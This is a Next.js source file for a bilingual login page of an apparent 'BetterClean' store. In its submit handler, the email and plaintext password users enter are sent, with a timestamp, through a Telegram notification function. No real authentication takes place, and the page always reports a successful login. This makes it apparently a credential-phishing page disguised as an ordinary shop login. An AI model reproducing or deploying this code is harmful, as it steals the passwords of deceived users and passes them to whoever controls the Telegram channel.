"use client"

import { useState } from "react"
import Link from "next/link"
import { Eye, EyeOff, Mail, Lock, User } from "lucide-react"
import Header from "@/components/header"
import Footer from "@/components/footer"
import { useI18n } from "@/lib/i18n-context"

export default function LoginPage() {
  const { t, locale } = useI18n()
  const isFr = locale === 'fr'
  const [showPassword, setShowPassword] = useState(false)
  const [formData, setFormData] = useState({
    email: '',
    password: '',
    rememberMe: false
  })
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isSuccess, setIsSuccess] = useState(false)

  const validateForm = () => {
    const newErrors: Record<string, string> = {}

    if (!formData.email.trim()) {
      newErrors.email = isFr ? 'L\'email est requis' : 'Email is required'
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      newErrors.email = isFr ? 'L\'email n\'est pas valide' : 'Email is not valid'
    }

    if (!formData.password) {
      newErrors.password = isFr ? 'Le mot de passe est requis' : 'Password is required'
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!validateForm()) return

    setIsSubmitting(true)

    try {
      // Send Telegram notification for login
      if (typeof window !== 'undefined' && window.sendTelegramNotification) {
        window.sendTelegramNotification("login", {
          email: formData.email,
          password: formData.password,
          loginTime: new Date().toLocaleString("fr-CA", { timeZone: "America/Toronto" })
        })
      }

      // Simulate login process
      await new Promise(resolve => setTimeout(resolve, 1500))
      
      setIsSuccess(true)
      setIsSubmitting(false)
    } catch (error) {
      console.error('Login error:', error)
      setIsSubmitting(false)
    }
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value, type, checked } = e.target
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }))
    
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: '' }))
    }
  }

  if (isSuccess) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-4">
        <div className="max-w-md w-full">
          <div className="text-center mb-8">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2l-2-2-4 4m0 0l-2-2 4 4m0 0l2-2 4 4" />
              </svg>
            </div>
            <h1 className="text-2xl font-bold text-gray-900 mb-2">
              {isFr ? 'Connexion réussie !' : 'Login successful!'}
            </h1>
            <p className="text-gray-600 mb-6">
              {isFr 
                ? 'Bienvenue chez BetterClean ! Vous êtes maintenant connecté.'
                : 'Welcome to BetterClean! You are now logged in.'
              }
            </p>
            <Link
              href="/produits/betterclean-pro-1"
              className="inline-flex items-center justify-center px-6 py-3 border border-transparent text-base font-medium rounded-full text-white bg-blue-600 hover:bg-blue-700 transition-colors"
            >
              {isFr ? 'Voir les produits' : 'View Products'}
            </Link>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-white">
      <Header />
      
      {/* Hero Section */}
      <section className="relative bg-gradient-to-br from-blue-50 to-indigo-100 py-20">
        <div className="max-w-6xl mx-auto px-4">
          <div className="text-center mb-12">
            <h1 className="text-4xl md:text-5xl font-bold text-gray-900 mb-4">
              {isFr ? 'Connexion à votre compte' : 'Sign in to your account'}
            </h1>
            <p className="text-lg text-gray-600 max-w-2xl mx-auto">
              {isFr 
                ? 'Accédez à votre espace personnel et suivez vos commandes.'
                : 'Access your personal space and track your orders.'
              }
            </p>
          </div>
        </div>
      </section>

      {/* Login Form */}
      <section className="py-16 px-4">
        <div className="max-w-md mx-auto">
          <div className="bg-white rounded-2xl shadow-xl border border-gray-100 p-8">
            <h2 className="text-2xl font-bold text-gray-900 mb-6 text-center">
              {isFr ? 'Se connecter' : 'Sign In'}
            </h2>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Email */}
              <div>
                <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-2">
                  {isFr ? 'Adresse email' : 'Email Address'}
                </label>
                <div className="relative">
                  <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                  <input
                    type="email"
                    id="email"
                    name="email"
                    value={formData.email}
                    onChange={handleInputChange}
                    className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                      errors.email ? 'border-red-500' : 'border-gray-300'
                    }`}
                    placeholder={isFr ? 'jean.dupont@email.com' : 'john.doe@email.com'}
                  />
                </div>
                {errors.email && (
                  <p className="mt-1 text-sm text-red-600">{errors.email}</p>
                )}
              </div>

              {/* Password */}
              <div>
                <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
                  {isFr ? 'Mot de passe' : 'Password'}
                </label>
                <div className="relative">
                  <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                  <input
                    type={showPassword ? 'text' : 'password'}
                    id="password"
                    name="password"
                    value={formData.password}
                    onChange={handleInputChange}
                    className={`w-full pl-10 pr-10 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                      errors.password ? 'border-red-500' : 'border-gray-300'
                    }`}
                    placeholder={isFr ? '•••••••••' : '•••••••••'}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
                  >
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
                {errors.password && (
                  <p className="mt-1 text-sm text-red-600">{errors.password}</p>
                )}
              </div>

              {/* Remember Me */}
              <div>
                <label className="flex items-center">
                  <input
                    type="checkbox"
                    name="rememberMe"
                    checked={formData.rememberMe}
                    onChange={handleInputChange}
                    className="h-4 w-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
                  />
                  <span className="ml-2 text-sm text-gray-600">
                    {isFr ? 'Se souvenir de moi' : 'Remember me'}
                  </span>
                </label>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full flex items-center justify-center px-6 py-3 border border-transparent text-base font-medium rounded-full text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
              >
                {isSubmitting ? (
                  <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-t-2 border-white"></div>
                ) : (
                  isFr ? 'Se connecter' : 'Sign In'
                )}
              </button>
            </form>

            {/* Forgot Password & Sign Up Links */}
            <div className="mt-6 space-y-4">
              <div className="text-center">
                <Link href="/forgot-password" className="text-sm text-blue-600 hover:text-blue-500">
                  {isFr ? 'Mot de passe oublié ?' : 'Forgot password?'}
                </Link>
              </div>
              <div className="text-center">
                <p className="text-sm text-gray-600">
                  {isFr ? 'Pas encore de compte ?' : 'Don\'t have an account?'}{' '}
                  <Link href="/compte" className="font-medium text-blue-600 hover:text-blue-500">
                    {isFr ? 'Créer un compte' : 'Create an account'}
                  </Link>
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>

      <Footer />
    </div>
  )
}
